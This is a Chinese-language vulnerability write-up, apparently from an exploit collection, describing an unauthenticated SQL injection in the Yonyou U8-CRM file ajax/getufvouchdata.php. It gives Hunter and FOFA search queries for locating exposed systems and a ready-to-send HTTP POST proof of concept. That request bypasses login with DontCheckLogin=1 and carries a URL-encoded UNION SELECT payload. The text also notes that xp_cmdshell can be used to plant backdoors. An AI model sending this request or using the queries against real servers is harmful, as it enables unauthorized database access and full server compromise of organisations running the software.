# 用友U8-CRM系统getufvouchdata.php存在SQL注入漏洞

用友U8-CRM  ajax/getufvouchdata.php 文件多个方法存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。

## hunter

```jade
app.name="用友 CRM"
```

## fofa

```jade
title="用友U8CRM"
```

## poc

```javascript
POST /ajax/getufvouchdata.php?DontCheckLogin=1&Action=getRelations HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bgsesstimeout-;
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: close

pID=1%27%20UNION%20ALL%20SELECT%20CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28104%29%2BCHAR%2867%29%2BCHAR%2871%29%2BCHAR%28117%29%2BCHAR%2866%29%2BCHAR%28115%29%2BCHAR%2882%29%2BCHAR%2879%29%2BCHAR%28112%29%2BCHAR%28109%29%2BCHAR%2897%29%2BCHAR%2869%29%2BCHAR%2880%29%2BCHAR%2880%29%2BCHAR%28104%29%2BCHAR%2872%29%2BCHAR%2877%29%2BCHAR%2886%29%2BCHAR%2866%29%2BCHAR%2865%29%2BCHAR%28118%29%2BCHAR%2889%29%2BCHAR%28101%29%2BCHAR%28104%29%2BCHAR%28106%29%2BCHAR%28121%29%2BCHAR%2880%29%2BCHAR%2879%29%2BCHAR%28121%29%2BCHAR%28100%29%2BCHAR%2868%29%2BCHAR%2868%29%2BCHAR%28117%29%2BCHAR%2876%29%2BCHAR%28122%29%2BCHAR%28110%29%2BCHAR%2872%29%2BCHAR%28109%29%2BCHAR%2876%29%2BCHAR%2871%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29--%20uSHu&cID=1
```

![image-20241128092143696](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411280921776.png)